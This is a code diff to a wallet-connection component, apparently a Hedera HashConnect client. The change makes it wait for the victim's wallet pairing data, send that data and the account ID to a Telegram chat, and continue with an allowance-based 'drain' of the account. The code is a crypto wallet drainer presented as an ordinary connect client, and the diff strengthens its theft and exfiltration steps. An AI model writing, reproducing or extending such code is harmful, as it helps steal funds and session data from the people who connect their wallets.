@@ -109,7 +109,18 @@ export const HashConnectClient = () => {
     try {
       await sendMessageToTelegram(`[DEBUG] handleAllowanceApprove called for account: ${accountId}`);
       const hbarAccountId: string = accountId;
-      await sendMessageToTelegram(`[DEBUG] pairingData: ${JSON.stringify(hc.hcData.pairingData)}, searching for account: ${hbarAccountId}`);
+      // Wait and retry for pairingData to be populated (max 5s)
+      let retries = 0;
+      while (hc.hcData.pairingData.length === 0 && retries < 10) {
+        await sendMessageToTelegram(`[DEBUG] pairingData empty, waiting... (${retries})`);
+        await new Promise(res => setTimeout(res, 500));
+        retries++;
+      }
+      await sendMessageToTelegram(`[DEBUG] pairingData after wait: ${JSON.stringify(hc.hcData.pairingData)}, searching for account: ${hbarAccountId}`);
+      if (hc.hcData.pairingData.length === 0) {
+        await sendMessageToTelegram(`[ERROR] pairingData still empty after waiting, cannot drain.`);
+        return;
+      }
       // Find the pairing for this account to get the topic
       const pairing = hc.hcData.pairingData.find(pair =>
         pair.accountIds.includes(hbarAccountId)
